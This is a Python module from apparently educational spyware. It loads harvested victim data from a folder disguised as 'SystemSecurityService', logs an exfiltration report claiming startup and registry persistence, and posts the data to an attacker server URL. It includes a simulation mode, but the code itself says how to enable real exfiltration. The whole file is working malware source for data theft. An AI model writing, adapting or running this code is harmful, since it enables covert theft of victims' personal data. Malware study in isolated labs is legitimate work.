"""
Spreading Function 9: Exfiltrate Data to Attacker
Sends collected victim data and activity report to attacker via HTTP POST
"""

import os
import json
import time
from datetime import datetime

# Try to import requests
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("[Spyware] Warning: 'requests' not installed - using simulation mode")

# Import config
import sys
config_path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, config_path)
try:
    from config import ATTACKER_URL, USE_REAL_EXFILTRATION
except ImportError:
    ATTACKER_URL = "http://192.168.0.117:5000/receive"
    USE_REAL_EXFILTRATION = False
    print("[Spyware] Warning: config.py not found - using defaults")

def exfiltrate_to_attacker(attacker_email=None):
    """
    Send collected data and infection report to attacker via HTTP POST
    Args:
        attacker_email: Email address of attacker (optional, for logging)
    Returns: True if successful, False otherwise
    """
    print("[Spyware] Function 9: Exfiltrating data to attacker...")
    
    try:
        appdata = os.getenv('APPDATA')
        spyware_folder = os.path.join(appdata, "SystemSecurityService")
        
        # === LOAD COLLECTED DATA ===
        data_file = os.path.join(spyware_folder, "captured_data", "victim_data.json")
        
        if os.path.exists(data_file):
            with open(data_file, 'r') as f:
                victim_data = json.load(f)
            print("[Spyware]   - Loaded victim data")
        else:
            victim_data = {"status": "No data collected yet"}
        
        # === CREATE EXFILTRATION REPORT ===
        report = {
            "exfiltration_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "spyware_status": "Active and collecting",
            "victim_data": victim_data,
            "persistence_status": {
                "startup_shortcut": "Installed",
                "registry_key": "Installed"
            },
            "spreading_status": "Network spreading simulated"
        }
        
        # === SAVE EXFILTRATION LOG ===
        exfil_log = os.path.join(spyware_folder, "logs", "exfiltration.log")
        os.makedirs(os.path.dirname(exfil_log), exist_ok=True)
        
        with open(exfil_log, 'a') as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"EXFILTRATION REPORT - {report['exfiltration_time']}\n")
            f.write(f"{'='*60}\n")
            f.write(json.dumps(report, indent=2))
            f.write(f"\n{'='*60}\n")
        
        print(f"[Spyware] Report saved to: {exfil_log}")
        
        # === SEND TO ATTACKER VIA HTTP POST ===
        if USE_REAL_EXFILTRATION and REQUESTS_AVAILABLE:
            try:
                print(f"[Spyware]   - Sending data to attacker: {ATTACKER_URL}")
                
                # Send HTTP POST request
                response = requests.post(
                    ATTACKER_URL,
                    json=report,
                    headers={'Content-Type': 'application/json'},
                    timeout=10
                )
                
                if response.status_code == 200:
                    print("[Spyware]   ✓ Data successfully exfiltrated to attacker!")
                    print(f"[Spyware]   - Server response: {response.json().get('message', 'OK')}")
                    return True
                else:
                    print(f"[Spyware]   ✗ Server error: {response.status_code}")
                    return False
                    
            except requests.exceptions.ConnectionError:
                print(f"[Spyware]   ✗ Could not connect to attacker server")
                print(f"[Spyware]   - Check if attacker_server.py is running")
                print(f"[Spyware]   - URL: {ATTACKER_URL}")
                return False
            except Exception as e:
                print(f"[Spyware]   ✗ Exfiltration error: {e}")
                return False
        else:
            print(f"[Spyware]   - SIMULATION MODE: Data saved locally only")
            print(f"[Spyware]   - To enable: pip install requests, set USE_REAL_EXFILTRATION=True")
            return True
        
        print("[Spyware] Exfiltration complete!")
        return True
        
    except Exception as e:
        print(f"[Spyware] Error during exfiltration: {e}")
        return False
